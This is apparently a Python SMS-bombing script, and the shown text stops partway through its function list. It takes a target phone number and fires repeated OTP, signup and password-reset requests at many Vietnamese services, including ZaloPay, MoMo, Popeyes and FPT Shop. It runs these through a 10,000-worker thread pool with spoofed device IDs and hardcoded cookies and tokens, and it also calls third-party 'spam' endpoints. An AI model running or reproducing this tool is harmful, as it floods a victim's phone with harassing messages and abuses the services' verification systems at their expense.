import json
import urllib.request
import urllib
import uuid
import requests
import hmac
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib, random ,time
from datetime import datetime
import bs4,base64
from time import sleep
import requests
import os, sys, requests, random, json
import time
from re import search
from random import choice, randint, shuffle
phone = sys.argv[1]
amount = 500
threading = ThreadPoolExecutor(max_workers=int(10000))
imei = uuid.uuid4()
ua = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',}
jsdt = {'phone_number': phone}
json_data = {
'feature': 'register',
'phone': '+84'+phone[1:11]}
headers = {
'Host': 'api.zalopay.vn',
'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
'x-device-model': 'iPhone8,2',
'x-density': 'iphone3x',
'authorization': 'Bearer ',
'x-device-os': 'IOS',
'x-drsite': 'off',
'accept': '*/*',
'x-app-version': '7.13.1',
'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
'x-platform': 'NATIVE',
'x-os-version': '14.6'}
params = {'phone_number': "0"+phone[1:11]}
headerss = {
'Host': 'moca.vn',
'Accept': '*/*',
'Device-Token': str(imei),
'X-Requested-With': 'XMLHttpRequest',
'Accept-Language': 'vi',
'X-Moca-Api-Version': '2',
'platform': 'P_IOS-2.10.42',
'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)'}
paramss = {'phoneNumber': phone}

def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
def a1(phone):
	token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
	json_data = {'phone_number': "0"+phone[1:11],'send_otp_token': token}
	response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
###
def a2(phone):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user":"0"+phone[1:11],
        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user":"0"+phone[1:11],
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id" : "undefined",
        "sessionkey" : "",
        "user_phone" : "undefined",
        "authorization" : "Bearer undefined",
        "msgtype" : "SEND_OTP_MSG",
        "Host" : "api.momo.vn",
        "User-Agent" : "okhttp/3.14.17",
        "app_version": "31062",
        "app_code" : "3.1.6",
        "device_os" : "ANDROID",
        "Content-Type" : "application/json"
    }
    data = json.dumps(data)
    data1 = json.dumps(data1)
    requests.post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG",headers=h,data=data1).text
    t = requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data)
    try:
        t = t.json()
    except:
        t = t.text
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
    return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
###
def a3(phone):
    cookies = {
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'anhzea.link',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'serverChoice=Server-IPv2',
    'origin': 'https://anhzea.link',
    'referer': 'https://anhzea.link/tools/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'Anhdz',
    }

    response = requests.post('https://anhzea.link/tools/', cookies=cookies, headers=headers, data=data)
def a4(phone):
	requests.post("https://products.popsww.com/api/v5/auths/register", headers={"Host": "products.popsww.com","content-length": "89","profileid": "62e58a27c6f857005396318f","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw","x-env": "production","content-type": "application/json","lang": "vi","sub-api-version": "1.1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","api-key": "5d2300c2c69d24a09cf5b09b","platform": "wap","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://pops.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue","accept-encoding": "gzip, deflate, br"}, json=({"fullName":"","account": phone,"password":"Abcxaxgh","confirmPassword":"Abcxaxgh"})).text
###
def a5(phone):
    cookies = {
        '_gcl_au': '1.1.1399171366.1685593865',
        '_gid': 'GA1.2.601043050.1685593865',
        '_gat_UA-106834068-1': '1',
        '_gat_UA-149855316-1': '1',
        '_ga': 'GA1.1.1352914107.1685593865',
        '_ga_Y4V7XHSR6R': 'GS1.1.1685593865.1.0.1685593865.0.0.0',
        '__admUTMtime': '1685593865',
        '__uidac': '3060068c024c57cf5bccf43037278ef8',
        '__iid': '',
        '__su': '0',
        '_fbp': 'fb.1.1685593872828.2142938916',
        '_ga_4YCG78W1LS': 'GS1.1.1685593865.1.1.1685593885.0.0.0',
        '_ga_X3WSB3MZGL': 'GS1.1.1685593865.1.1.1685593885.40.0.0',
    }

    headers = {
        'authority': 'api.popeyes.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1399171366.1685593865; _gid=GA1.2.601043050.1685593865; _gat_UA-106834068-1=1; _gat_UA-149855316-1=1; _ga=GA1.1.1352914107.1685593865; _ga_Y4V7XHSR6R=GS1.1.1685593865.1.0.1685593865.0.0.0; __admUTMtime=1685593865; __uidac=3060068c024c57cf5bccf43037278ef8; __iid=; __su=0; _fbp=fb.1.1685593872828.2142938916; _ga_4YCG78W1LS=GS1.1.1685593865.1.1.1685593885.0.0.0; _ga_X3WSB3MZGL=GS1.1.1685593865.1.1.1685593885.40.0.0',
        'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': phone,
        'firstName': 'to',
        'lastName': 'lon xinh',
        'email': 'hihi@gmail.com',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data)
def a6(phone):
	requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN", headers={"Host": "api.alfrescos.com.vn","content-length": "124","accept-language": "vi-VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","brandcode": "ALFRESCOS","devicecode": "web","sec-ch-ua-platform": "\"Android\"","origin": "https://alfrescos.com.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://alfrescos.com.vn/","accept-encoding": "gzip, deflate, br"}, json=({"phoneNumber": phone,"secureHash":"add789229e0794d8508f948dacd710ae","deviceId":"","sendTime":1660806807513,"type":2})).text
###
def a7(phone):
	requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
###
def a8(phone):
  cookies = {
        'tts-utm-source': 'googlese',
    'tts_analytics_guest_id': 'KcJ8kcv2yoB_HmJ2jAeyq',
    'XSRF-TOKEN': 'w8bkzBB87P2JJM7xB0vnaX01mrpDncsjgWgft5i6',
    'laravel_session': 'Y1dYlFAjILNvV2icXH1CbK6jHZT36yLfGFltw87O',
    '_gcl_au': '1.1.1694890977.1692777330',
    '_ga': 'GA1.1.1851201171.1692777330',
    '_hjSessionUser_1638305': 'eyJpZCI6IjNkMWRkYzJiLWU5NzEtNTY4OS04MWZiLTBhOTQ3MDNmNzcyOSIsImNyZWF0ZWQiOjE2OTI3NzczMzA1NzcsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_1638305': '0',
    '_hjSession_1638305': 'eyJpZCI6Ijg0NTE0MjIwLTQxMTYtNGJlZC04ZWY1LWQyMWFmMGFhZTg0NyIsImNyZWF0ZWQiOjE2OTI3NzczMzA1ODksImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    'NPS_81d9bd77_last_seen': '1692777330610',
    '_ym_uid': '1692777332339492154',
    '_ym_d': '1692777332',
    '_ym_isad': '1',
    '_ym_visorc': 'w',
    '_ga_W85LP5ZTQK': 'GS1.1.1692777330.1.1.1692777344.46.0.0',
    }
  headers = {
        'authority': 'thitruongsi.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://thitruongsi.com',
    'referer': 'https://thitruongsi.com/user/register',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    'x-xsrf-token': 'w8bkzBB87P2JJM7xB0vnaX01mrpDncsjgWgft5i6',
}
  json_data = {
    'account_phone': phone,
    'recaptcha_token': '03ADUVZwBVmGIojbIrLuRboS6LWXDSntLMZYFUiwAM47ossGEgHMMFOuWl0ENG6faF1e5zOvuu-U0a7-LJVrKXLpOyvUawuP2iuwHSRVJlKkJzKZ-GHxJFReoSjjRRvofpI4jyxeCq1iZgaPg49pUwTyEOeAjO-kwBGVqhQtc93wUw1tiv9jJ_aj9kryrOIcjrPI76Jadz4eGbtl3afKh6ZCrZszjrNYV-R4AUPNTGl3aNcBRUKXZFpHbMWlE3ggI3ksUz9TvopPp8YKzIdpLfcAmqoRCeY0wJHEKE8k27JyOlP_uVSZPXJqe1hsCiUjdNlT8e6IiRtmoPKSrPHyVIdEvjEyfIRnDBAD-JPLcW-4LiNPsvi_REP_i8m7-zYe-1oghyo9Np1LNM44ALzdlgX0MaQL19vT5PlElf71qUOXeDmfA8KIdnCZPxsG2JCEaAm3YsxaOaP7xLH7nc5PT7eALXBqSdV1NFUjyar71B-1R0EFfUVv5Iwe9qiY-wZSLfZzBUZiY-UCWh9-fVDiPWz4-SAxKRc5-U8A4lUjalCRl-xFPke7fOG2OWg7hwUTAgTSOEzAEGUndb',
}

  response = requests.post(
    'https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def loship(phone):
	requests.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", headers={"Host": "latte.lozi.vn","content-length": "101","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]})).text
###
def a9(phone):
    response = requests.get(f"https://dichvugiare.site/spamv2.php?phone={phone}")
def a10(phone):
    response = requests.post("https://mocha.lozi.vn/v6/invites/use-app", headers={"Host": "mocha.lozi.vn","content-length": "47","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]}))
###
def a11(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
#$#
def a12(phone):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': '0972936627',
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': phone,
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    )
def a13(phone):
    cookies = {
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'shopmodviptest.000webhostapp.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'serverChoice=Server-IPv2',
    'origin': 'https://shopmodviptest.000webhostapp.com',
    'referer': 'https://shopmodviptest.000webhostapp.com/index.php',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'FAMOD',
    }

    response = requests.post('https://shopmodviptest.000webhostapp.com/index.php', cookies=cookies, headers=headers, data=data)
def loveyou(phone):
    cookies = {
        'PLAY_LANG': 'vi',
    'M4B': 'eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7Imxhbmd1YWdlIjoidmkiLCJjc3JmVG9rZW4iOiJhM2FiNzM4NDAxZTczNGRiYWI4YWM0YWM3NDcxYTk0YTBjODI4YTVkLTE2ODkwMzg1NjMyMDktZDVlZDQyY2E2NWIwNThmMzBlODA1NTIwIn0sIm5iZiI6MTY4OTAzODU2NSwiaWF0IjoxNjg5MDM4NTY1fQ.S-3W1b0osRp9PlL-V3HNAcA3l7wXECvU0Tqm3SNA-Ec',
    }

    headers = {
        'Accept': 'application/json',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer null',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'PLAY_LANG=vi; M4B=eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7Imxhbmd1YWdlIjoidmkiLCJjc3JmVG9rZW4iOiJhM2FiNzM4NDAxZTczNGRiYWI4YWM0YWM3NDcxYTk0YTBjODI4YTVkLTE2ODkwMzg1NjMyMDktZDVlZDQyY2E2NWIwNThmMzBlODA1NTIwIn0sIm5iZiI6MTY4OTAzODU2NSwiaWF0IjoxNjg5MDM4NTY1fQ.S-3W1b0osRp9PlL-V3HNAcA3l7wXECvU0Tqm3SNA-Ec',
    'Origin': 'https://business.momo.vn',
    'Referer': 'https://business.momo.vn/sanpham/auth/forgot-passwd',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'undefined': 'undefined',
    }
    params = {
    'language': 'vi',
    }
    json_data = {
        'phoneNumber': phone,
    }

    response = requests.post(
    'https://business.momo.vn/api/authentication/v1/users/password/otp',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def a14(phone):
	requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone[1:11]})).text
###
def a15(phone):
	requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
###
def a16(phone):
